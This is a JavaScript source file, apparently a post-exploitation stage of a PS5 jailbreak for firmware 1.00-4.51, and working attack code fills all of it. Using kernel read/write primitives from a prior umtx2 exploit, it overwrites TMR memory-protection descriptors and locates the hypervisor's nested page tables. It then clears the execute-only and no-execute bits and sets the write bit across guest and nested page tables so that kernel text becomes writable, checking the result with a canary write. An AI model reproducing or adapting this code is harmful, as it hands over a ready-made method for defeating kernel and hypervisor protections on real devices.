// @ts-check

// TMR/XOT Defeat for PS5 (FW 1.00-4.51)
// Disables TMR descriptors, then clears XOTEXT+NX in guest and nested page tables.

const TMR_INDIRECT_ADDR = 0xF00C2080;
const TMR_INDIRECT_DATA = 0xF00C2084;
const TMR_CONFIG_VALID = 0x1;
const TMR_CONFIG_PERMISSIVE = 0x3F07;
const VMCB_NCR3 = 0xB0;

const PTE_PRESENT  = 0x001;
const PTE_WRITE    = 0x002;
const PTE_PS       = 0x080;
const PTE_ADDR_LO  = 0xFFFFF000;
const PTE_ADDR_HI  = 0x000FFFFF;
const PTE_XOTEXT_HI = 0x04000000;
const PTE_NX_HI     = 0x80000000;

function i64add(a, b) {
    var al = a.low >>> 0, bl = b.low >>> 0;
    var lo = (al + bl) >>> 0;
    var hi = ((a.hi >>> 0) + (b.hi >>> 0) + ((lo < al) ? 1 : 0)) >>> 0;
    return new int64(lo, hi);
}

function i64shl16(v) {
    return new int64((v << 16) >>> 0, (v >>> 16) >>> 0);
}

function computeDmapBase(dmpml4i, dmpdpi) {
    return new int64((dmpdpi << 30) >>> 0, (0xFFFF8000 | (dmpml4i << 7)) >>> 0);
}

function dmapVA(dmap, pa) {
    return i64add(dmap, pa);
}

function ptePA(pte) {
    return new int64((pte.low & PTE_ADDR_LO) >>> 0, (pte.hi & PTE_ADDR_HI) >>> 0);
}

function levelIdx(addr, level) {
    var s = 12 + 9 * (level - 1);
    if (s >= 32) return (addr.hi >>> (s - 32)) & 0x1FF;
    if (s + 9 > 32) return ((addr.low >>> s) | (addr.hi << (32 - s))) & 0x1FF;
    return (addr.low >>> s) & 0x1FF;
}

function ptePatch(pte, clrHi, clrLo, setHi, setLo) {
    return new int64(((pte.low & ~clrLo) | setLo) >>> 0, ((pte.hi & ~clrHi) | setHi) >>> 0);
}

async function tmrReadReg(krw, dmap, off) {
    await krw.write4(dmap.add32(TMR_INDIRECT_ADDR), off);
    return await krw.read4(dmap.add32(TMR_INDIRECT_DATA));
}

async function tmrWriteReg(krw, dmap, off, val) {
    await krw.write4(dmap.add32(TMR_INDIRECT_ADDR), off);
    await krw.write4(dmap.add32(TMR_INDIRECT_DATA), val);
}

async function tmrDefeat(krw, dmap, log) {
    var fw = window.fw_float;
    var targets = [
        [16, "Kernel", 0],
        [5,  "HV",     3.00],
        [17, "HV",     3.00],
    ];

    for (var t = 0; t < targets.length; t++) {
        var idx = targets[t][0], name = targets[t][1], minFw = targets[t][2];
        if (fw < minFw) continue;

        var base = await tmrReadReg(krw, dmap, idx * 16);
        var config = await tmrReadReg(krw, dmap, idx * 16 + 8);

        if (base === 0) { log("TMR[" + idx + "] (" + name + ") base=0, skip", LogLevel.LOG); continue; }
        if (!(config & TMR_CONFIG_VALID)) { log("TMR[" + idx + "] (" + name + ") not valid, skip", LogLevel.LOG); continue; }

        await tmrWriteReg(krw, dmap, idx * 16 + 8, TMR_CONFIG_PERMISSIVE);
        var nc = await tmrReadReg(krw, dmap, idx * 16 + 8);
        var ok = (nc === TMR_CONFIG_PERMISSIVE);

        log("TMR[" + idx + "/" + name + "] 0x" + config.toString(16) + " -> 0x" + nc.toString(16) + (ok ? " OK" : " FAIL"), ok ? LogLevel.INFO : LogLevel.ERROR);
        if (!ok) throw new Error("TMR[" + idx + "] defeat failed");
    }
}

async function discoverNpt(krw, dmap, log) {
    var fw = window.fw_float;

    var tmr16Base = await tmrReadReg(krw, dmap, 16 * 16);
    if (tmr16Base === 0) throw new Error("TMR[16].base = 0");

    var kernelPA = i64shl16(tmr16Base);
    var hvDataPA = i64add(kernelPA, new int64(OFFSET_KERNEL_TEXT_SIZE, 0));

    log("HV data PA=0x" + hvDataPA.toString(16), LogLevel.LOG);

    if (fw < 3.00) {
        for (var c = 0; c < 16; c++) {
            var ptrPA = hvDataPA.add32(OFFSET_HV_VCPU + c * OFFSET_HV_VCPU_CPUID);
            var vmcbVA = await krw.read8(dmapVA(dmap, ptrPA));

            if (((vmcbVA.hi >>> 16) & 0xFFFF) !== 0xFFFF) continue;
            if ((vmcbVA.low & 0xFFF) !== 0) continue;

            var ncr3 = await krw.read8(vmcbVA.add32(VMCB_NCR3));
            if ((ncr3.low === 0 && ncr3.hi === 0) || (ncr3.low & 0xFFF) !== 0) continue;

            log("nCR3=0x" + ncr3.toString(16) + " (core " + c + ")", LogLevel.INFO);
            return ncr3;
        }
    } else {
        var hvBssPA = i64add(hvDataPA, new int64(OFFSET_HV_BSS_OFF, 0));
        var vcpuArrayPA = i64add(hvBssPA, new int64(OFFSET_HV_VCPU_ARRAY_OFF, 0));

        for (var c = 0; c < 16; c++) {
            var vcpuPA = vcpuArrayPA.add32(c * OFFSET_HV_VCPU_STRIDE);
            var vmcbVA = await krw.read8(dmapVA(dmap, vcpuPA.add32(OFFSET_HV_VCPU_VMCB_PTR)));

            if (((vmcbVA.hi >>> 16) & 0xFFFF) !== 0xFFFF) continue;
            if ((vmcbVA.low & 0xFFF) !== 0) continue;

            var ncr3 = await krw.read8(vmcbVA.add32(VMCB_NCR3));
            if ((ncr3.low === 0 && ncr3.hi === 0) || (ncr3.low & 0xFFF) !== 0) continue;

            log("nCR3=0x" + ncr3.toString(16) + " (core " + c + ")", LogLevel.INFO);
            return ncr3;
        }
    }

    throw new Error("Failed to discover nCR3");
}

async function patchPageTables(krw, dmap, guestPml4VA, ncr3, vaStart, rangeSize, log) {
    var clrHi = PTE_XOTEXT_HI | PTE_NX_HI;
    var setLo = PTE_WRITE;

    var gPml4Idx = levelIdx(vaStart, 4);
    var gPdptIdx = levelIdx(vaStart, 3);

    var gPml4e = await krw.read8(guestPml4VA.add32(gPml4Idx * 8));
    if (!(gPml4e.low & PTE_PRESENT)) throw new Error("Guest PML4E not present");

    var gPdpte = await krw.read8(dmapVA(dmap, ptePA(gPml4e)).add32(gPdptIdx * 8));
    if (!(gPdpte.low & PTE_PRESENT)) throw new Error("Guest PDPTE not present");

    var gPdBase = dmapVA(dmap, ptePA(gPdpte));
    var nPml4Base = dmapVA(dmap, ncr3);

    var cachedNPdptPA_lo = -1, cachedNPdptPA_hi = -1;
    var cachedNPdBase = null;

    var count = 0;
    var step = 0x200000;

    for (var offset = 0; offset < rangeSize; offset += step) {
        var va = vaStart.add32(offset);
        var gPdIdx = levelIdx(va, 2);

        var gPde = await krw.read8(gPdBase.add32(gPdIdx * 8));
        if (!(gPde.low & PTE_PRESENT)) continue;

        var newGPde = ptePatch(gPde, clrHi, 0, 0, setLo);
        if (newGPde.low !== gPde.low || newGPde.hi !== gPde.hi) {
            await krw.write8(gPdBase.add32(gPdIdx * 8), newGPde);
        }

        if (!(gPde.low & PTE_PS)) continue;

        var gPdePA = ptePA(gPde);
        var baseGPA = new int64((gPdePA.low & 0xFFE00000) >>> 0, gPdePA.hi);

        var nPml4Idx = levelIdx(baseGPA, 4);
        var nPml4e = await krw.read8(nPml4Base.add32(nPml4Idx * 8));
        if (!(nPml4e.low & PTE_PRESENT)) continue;

        var nPdptPA = ptePA(nPml4e);
        var nPdptIdx = levelIdx(baseGPA, 3);

        if (cachedNPdptPA_lo !== nPdptPA.low || cachedNPdptPA_hi !== nPdptPA.hi) {
            var nPdpte = await krw.read8(dmapVA(dmap, nPdptPA).add32(nPdptIdx * 8));
            if (!(nPdpte.low & PTE_PRESENT)) continue;
            cachedNPdBase = dmapVA(dmap, ptePA(nPdpte));
            cachedNPdptPA_lo = nPdptPA.low;
            cachedNPdptPA_hi = nPdptPA.hi;
        }

        var nPdIdx = levelIdx(baseGPA, 2);
        var nPde = await krw.read8(cachedNPdBase.add32(nPdIdx * 8));
        if (!(nPde.low & PTE_PRESENT)) continue;

        if (nPde.low & PTE_PS) {
            var newNPde = ptePatch(nPde, clrHi, 0, 0, setLo);
            if (newNPde.low !== nPde.low || newNPde.hi !== nPde.hi) {
                await krw.write8(cachedNPdBase.add32(nPdIdx * 8), newNPde);
            }
            count += 512;
        } else {
            var nPtBase = dmapVA(dmap, ptePA(nPde));
            var subPages = Math.min(512, (rangeSize - offset) >>> 12);
            for (var s = 0; s < subPages; s++) {
                var nPte = await krw.read8(nPtBase.add32(s * 8));
                if (!(nPte.low & PTE_PRESENT)) continue;
                var newNPte = ptePatch(nPte, clrHi, 0, 0, setLo);
                if (newNPte.low !== nPte.low || newNPte.hi !== nPte.hi) {
                    await krw.write8(nPtBase.add32(s * 8), newNPte);
                }
                count++;
            }
        }

        log("XOTEXT: 0x" + va.toString(16) + " (" + count + " pages)", LogLevel.LOG | LogLevel.FLAG_TEMP);
    }

    return count;
}

/**
 * Main entry point: disable TMR for kernel/HV, then clear XOTEXT in guest+nested page tables.
 * @param {Object} krw - kernel read/write primitives from umtx2 exploit
 * @param {Object} chain - ROP chain (worker_rop) for syscalls
 * @param {function} log - logging function
 */
async function disableTmrAndXot(krw, chain, log) {
    log("Stage: TMR/XOT Defeat", LogLevel.INFO);

    var dmpml4i = await krw.read4(krw.ktextBase.add32(OFFSET_KERNEL_DMPML4I));
    var dmpdpi = await krw.read4(krw.ktextBase.add32(OFFSET_KERNEL_DMPDPI));
    var dmap = computeDmapBase(dmpml4i, dmpdpi);

    log("DMAP base=0x" + dmap.toString(16), LogLevel.INFO);

    await tmrDefeat(krw, dmap, log);

    var ncr3 = await discoverNpt(krw, dmap, log);

    var pmapAddr = krw.ktextBase.add32(OFFSET_KERNEL_PMAP_STORE);
    var guestPml4VA = await krw.read8(pmapAddr.add32(OFFSET_KERNEL_PMAP_PM_PML4));
    if (guestPml4VA.low === 0 && guestPml4VA.hi === 0) throw new Error("Guest PML4 VA is 0");

    log("Guest PML4=0x" + guestPml4VA.toString(16), LogLevel.LOG);

    var rangeSize = OFFSET_KERNEL_DATA + 0x7000000;
    log("Setting RWX: 0x" + krw.ktextBase.toString(16) + " +0x" + rangeSize.toString(16), LogLevel.INFO);

    var count = await patchPageTables(krw, dmap, guestPml4VA, ncr3, krw.ktextBase, rangeSize, log);
    log("Patched " + count + " pages", LogLevel.INFO);

    await chain.syscall(SYS_SCHED_YIELD);

    var testAddr = krw.ktextBase.add32(0xA0);
    var orig = await krw.read8(testAddr);
    var canary = new int64(0x42424242, 0x41414141);
    await krw.write8(testAddr, canary);
    var after = await krw.read8(testAddr);
    await krw.write8(testAddr, orig);

    var ok = (after.low === canary.low && after.hi === canary.hi);
    log(".text probe: " + (ok ? "OK" : "FAIL"), ok ? LogLevel.SUCCESS : LogLevel.ERROR);

    if (!ok) throw new Error("XOTEXT defeat verification failed");
}
